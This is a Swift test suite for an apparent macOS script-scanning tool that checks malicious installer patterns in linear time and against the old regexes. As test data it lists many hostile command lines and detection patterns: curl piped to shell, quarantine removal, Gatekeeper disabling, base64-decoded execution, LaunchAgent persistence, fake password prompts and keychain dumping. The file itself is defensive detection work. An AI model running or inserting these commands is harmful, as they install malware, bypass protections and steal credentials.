import Foundation
import Testing
@testable import VitrineTrust

/// S-16 hardening (F43): the script lens's rules are linear scans now. The pathological lines below made the old
/// regular expressions backtrack in cubic or quadratic time inside the thumbnail and preview extensions; each must
/// finish within a tight budget. A differential check keeps the old patterns as an oracle and compares the scans
/// with them on many generated lines. Every script is invented here. roadmap: S-16
@Suite("Script lens is linear (F43)")
struct S16ParsersTrustTests {
    /// The patterns the scans replace, exactly as they were (case-insensitive), used only as the oracle.
    static let oracle: [NSRegularExpression] = [
        #"\b(curl|wget)\b[^|;&\n]*\|\s*(sudo\s+)?(ba|z|da|k)?sh\b|\b(curl|wget)\b[^|;&\n]*\|\s*(python3?|perl|ruby|osascript|node)\b|\b(ba|z)?sh\s+-c\s+"?\$\((curl|wget)\b|\b(curl|wget)\b[^\n]*(-o|--output|-O)\s*\S+[^\n]*(&&|;)\s*(chmod\s+\+x|open|sh|bash)\b|\biex\s*\(?\s*\(?\s*(iwr|irm|Invoke-WebRequest|Invoke-RestMethod)\b|do shell script\s+"[^"]*(curl|wget)"#,
        #"\bxattr\b[^\n]*\s-[a-z]*d[a-z]*\b[^\n]*com\.apple\.quarantine|\bxattr\s+-[a-z]*c[a-z]*\b|spctl\s+(--master-disable|--global-disable|--add)"#,
        #"\b(base64|openssl\s+(base64|enc))\b[^\n]*(-d|--decode|-D)\b[^\n]*\|\s*(sudo\s+)?((ba|z)?sh|python3?|perl|ruby|osascript|node)\b|\beval\s+"?\$\([^)]*base64|\bpython3?\s+-c\s+["'][^"']*(b64decode|exec\()"#,
        #"Library/Launch(Agents|Daemons)|\blaunchctl\s+(load|bootstrap|submit|enable)\b|login item|\bcrontab\b|RunAtLoad"#,
        #"display dialog[^\n]*(password|passwort|mot de passe)[^\n]*|with hidden answer|\bsudo\s+-S\b|\bdscl\b[^\n]*-authonly|security\s+(find-generic-password|dump-keychain)"#,
    ].map { try! NSRegularExpression(pattern: $0, options: [.caseInsensitive]) }

    static func timed(_ body: () -> Void) -> Duration {
        let clock = ContinuousClock(), start = clock.now
        body()
        return clock.now - start
    }

    @Test func pathologicalLinesFinishFast() {
        let lines = [
            "curl " + String(repeating: "-o", count: 30_000),                       // the finding's input, cubic before
            String(repeating: "curl ", count: 13_000),                               // a restart at every curl
            "iex" + String(repeating: " ", count: 60_000),                           // three overlapping \s*
            "xattr" + String(repeating: " -d", count: 20_000),                       // two overlapping [^\n]*
            "xattr -" + String(repeating: "c", count: 60_000) + "1",                 // [a-z]*c[a-z]* backtracking
            "base64" + String(repeating: " -d", count: 20_000),
            String(repeating: "eval $(", count: 8_000),
            String(repeating: "display dialog ", count: 4_000),
            String(repeating: "dscl ", count: 12_000),
            String(repeating: "do shell script \"", count: 3_000),
        ]
        for line in lines {
            let took = Self.timed { _ = ScriptLens.scan(script: line, launcher: false) }
            #expect(took < .seconds(2), "\(line.prefix(24))… took \(took)")
        }
    }

    @Test func aScriptOfManyLongLinesFinishesFast() {
        let script = (0..<64).map { _ in "curl x " + String(repeating: "-o ", count: 1_000) }.joined(separator: "\n")
        #expect(Self.timed { _ = ScriptLens.scan(script: script, launcher: false) } < .seconds(2))
        // A self-extracting installer: 4 MB of payload lines after a short header.
        let payload = String(repeating: "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkr\n", count: 50_000)
        let installer = "#!/bin/sh\ntail -n +4 \"$0\" | base64 -d | tar x\nexit 0\n" + payload
        var report: LensReport?
        #expect(Self.timed { report = ScriptLens.scan(script: installer, launcher: false) } < .seconds(4))
        #expect(report == nil, "decoding into tar runs no code")
    }

    @Test func handPickedLinesAgreeWithTheOldPatterns() {
        let lines = [
            "curl -fsSL https://example.net/a.sh | bash", "curl https://example.net/x | sudo  sh", "wget -qO- x |python3",
            "curl x || sh", "curl x; echo | sh", "curl x & | sh", "libcurl x | sh", "curl x | shell", "CURL x | SH",
            "sh -c \"$(curl -fsSL https://example.net)\"", "bash -c $(wget x)", "zsh  -C  \"$(CURL x", "xsh -c \"$(curl",
            "curl -o /tmp/i https://example.net && chmod +x /tmp/i", "curl -O x; open x", "curl x --output f;sh f",
            "curl -o;sh", "curl -o f ; ./f", "curl -oinstall.sh && bash install.sh", "curl x -o", "wget -O f && chmod  +x",
            "iex (iwr https://example.net)", "iex((Invoke-WebRequest x))", "IEX ( ( irm x", "iex (((iwr", "iexplore iwr",
            "do shell script \"curl https://example.net\"", "do shell script \"echo\" curl", "undo shell script  \"wget",
            "xattr -dr com.apple.quarantine ~/Downloads/x", "xattr -d com.apple.quarantine x", "xattr -l x",
            "xattr -c x", "xattr -cr x", "xattr -c1 x", "xattr  -rc", "xattr x -d1 com.apple.quarantine", "spctl --master-disable",
            "spctl --add x", "echo \"$P\" | base64 -d | python3", "openssl enc -d -base64 | sh", "base64 --decode f | sudo bash",
            "base64 -D x | node", "base64 -dx | sh", "eval \"$(echo x | base64 -d)\"", "eval $(cat) base64",
            "python3 -c 'import base64;exec(base64.b64decode(x))'", "python -c \"exec(x)\"", "python3x -c 'exec('",
            "mkdir -p ~/Library/LaunchAgents", "launchctl load x", "launchctl loadx", "crontab -e", "x RunAtLoad",
            "display dialog \"Enter your Mac password\"", "with hidden answer", "sudo -S true", "sudo -s",
            "dscl . -authonly u p", "security find-generic-password -s x", "security  dump-keychain", "swift build -c release",
            // A CRLF script reaches the lens as one line holding line feeds: `[^\n]` stops at them, `\s` crosses them.
            "curl x\r\n| sh", "curl x |\r\n sh", "curl -o\n f ; sh", "curl\n-o f; sh", "curl -o f\n; sh",
            "xattr\n-d com.apple.quarantine", "xattr\n -d com.apple.quarantine", "xattr -d\ncom.apple.quarantine",
            "base64 -d\n| sh", "base64 -d |\nsh", "openssl\nenc -d | sh", "display dialog\npassword", "dscl\n-authonly",
            "sh -c\n\"$(curl", "curl\u{0301} x | sh", "Library/LaunchAgents\u{0301}",
        ]
        for line in lines { compare(line) }
    }

    @Test func generatedLinesAgreeWithTheOldPatterns() {
        let tokens = ["curl", "wget", "CURL", " ", "  ", "\t", "-o", "-O", "--output", "|", ";", "&&", "&", "sh", "bash", "zsh",
                      "dash", "ksh", "sudo", "python", "python3", "perl", "node", "x", "f", "chmod", "+x", "open", "iex", "(",
                      "iwr", "irm", "Invoke-WebRequest", "do shell script", "\"", "'", "xattr", "-d", "-dr", "-c", "-cr",
                      "-c1", "com.apple.quarantine", "spctl", "--master-disable", "--add", "base64", "openssl", "enc",
                      "--decode", "-D", "eval", "$(", ")", "-c", "b64decode", "exec(", "Library/LaunchAgents",
                      "Library/LaunchDaemons", "launchctl", "load", "login item", "crontab", "RunAtLoad", "display dialog",
                      "password", "mot de passe", "with hidden answer", "-S", "dscl", "-authonly", "security",
                      "find-generic-password", "dump-keychain", "1", "_", "é", "3", "/", "\n", "\r\n", "\u{0301}", "\u{2028}"]
        var seed: UInt64 = 0x5EED_0016
        func next(_ n: Int) -> Int {
            seed = seed &* 6364136223846793005 &+ 1442695040888963407
            return Int((seed >> 33) % UInt64(n))
        }
        for _ in 0..<30_000 {
            let line = (0..<(1 + next(12))).map { _ in tokens[next(tokens.count)] }.joined(separator: next(3) == 0 ? "" : " ")
            compare(line)
        }
    }

    private func compare(_ line: String, sourceLocation: SourceLocation = #_sourceLocation) {
        let prepared = ScriptLine(line)
        for (rule, pattern) in zip(ScriptLens.rules, Self.oracle) {
            let expected = pattern.firstMatch(in: line, range: NSRange(location: 0, length: (line as NSString).length)) != nil
            #expect(rule.test(prepared) == expected, "\(rule.title()): \(line)", sourceLocation: sourceLocation)
            if expected { #expect(rule.mayMatch(line.lowercased()), "keywords must not skip: \(line)", sourceLocation: sourceLocation) }
        }
    }
}
